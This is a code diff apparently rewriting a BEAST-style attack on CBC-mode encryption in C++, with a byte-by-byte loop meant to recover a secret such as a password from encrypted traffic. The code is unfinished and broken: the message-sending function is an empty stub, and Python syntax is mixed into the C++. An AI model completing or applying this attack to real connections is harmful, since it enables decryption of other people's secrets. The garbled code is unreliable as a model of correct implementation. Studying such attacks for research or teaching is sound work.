@@ -1,13 +1,13 @@
 #include "beast.h"
 
-BeastDecrypter::BeastDecrypter(int max_len){
+BeastDecrypter::BeastDecrypter(int max_len, int _block_size):block_size(_block_size){
     buf = (char*)malloc(max_len);
     recv = (char*)malloc(max_len);
 }
 
-BeastDecrypter::send_malicious_message(char* buf, int len, char* ){
+void BeastDecrypter::send_malicious_message(char* buf, int len, char* recv){
     //TODO: the controller forces the sender to send the message to server
-    // and give the encrypted message back to controller 
+    // and give the encrypted message back to controller
 }
 
 void BeastDecrypter::run(const std::string secret, const std::string known_head) {
@@ -15,25 +15,25 @@ void BeastDecrypter::run(const std::string secret, const std::string known_head)
 
 
     // padding is the length we need to add to i_know to create a length of 15 bytes (block size- 1)
-    int padding = 16 - (strlen(known_head) - 1) % 16;
+    int padding = 16 - (known_head.size() - 1) % 16;
     std::string head_with_padding = known_head;
     int length_block = 16;
     int t = 0;
     for (int i=0; i<padding; i++)
-    {
-        known_head = "a" + 
-    }
-
-    first_r = split_len(send_malicious_message("could be any message"), 32);
-    std::string lastBlockOfFirst = str(first_r[-length_block:])
-
-    while (t < (len(find_me) - len("password: "))){
-        if (padding < 0)
-            s = find_me[-1 * (padding):];
-        else s = find_me;
+        head_with_padding = "a" + head_with_padding;
+    
+    send_malicious_message("could-be-any-message", block_size, recv);
+    std::string rcvd = recv; 
+    std::string lastBlockOfFirst = rcvd.substr(rcvd.size() - block_size);
+    int work_left = secret.size() - known_head.size();
+    while (t < work_left){
+        std::string s;
+        if (padding < 0)   
+            s = rcvd.substr(rcvd.length() - padding);
+        else s = secret;
 
         for (int i=0; i<256; i++) {
-            enc = encrypt("a" * (padding) + s, lastBlockOfFirst);
+            send_malicious_message("a" * padding + s, padding + s.length(), recv);
 
             cipherBlocks = split_len(binascii.hexlify(enc), 32);
 
